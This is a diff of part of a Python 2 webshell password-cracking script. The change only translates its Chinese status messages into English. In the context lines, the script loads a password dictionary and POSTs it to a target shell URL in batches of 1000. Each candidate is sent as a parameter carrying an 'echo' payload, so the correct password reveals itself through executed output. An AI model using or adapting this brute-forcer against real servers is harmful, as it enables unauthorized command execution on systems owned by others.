@@ -11,8 +11,8 @@ def crack(shellurl):
     s = open(pass_dic,'r')
     content = s.readlines()  # 分行读取字典
     dics = len(content) / 1000
-    print '当前字典中变量个数为: %s' % str(len(content))
-    print "字典将被分割为 %s 份" % str(dics)
+    print 'The number of dictionaries is: %s' % str(len(content))
+    print "The dictionary will be divided into %s parts" % str(dics)
     group = []  # 字典每行独立化,写入元组
     for h in range(0,len(content)):
         password = str(content[h]).strip('\n')  # 剔除换行符
@@ -31,7 +31,7 @@ def crack(shellurl):
         for each in new_group:
             post_data[each] = 'echo "password is %s";' % each
         r = requests.post(shell,data = post_data)
-        print "正在进行第 %s 组字典爆破" % str(i + 1)
+        print "cracking part %s " % str(i + 1)
         post_data.clear()
         i += 1
         print r.text
@@ -45,5 +45,5 @@ def crack(shellurl):
     for each in new_group1:
         post_data[each] = 'echo "password is %s";' % each
     r = requests.post(shell,data = post_data)
-    print "正在进行余数字典爆破"
+    print "cracking remainder part "
     print r.text
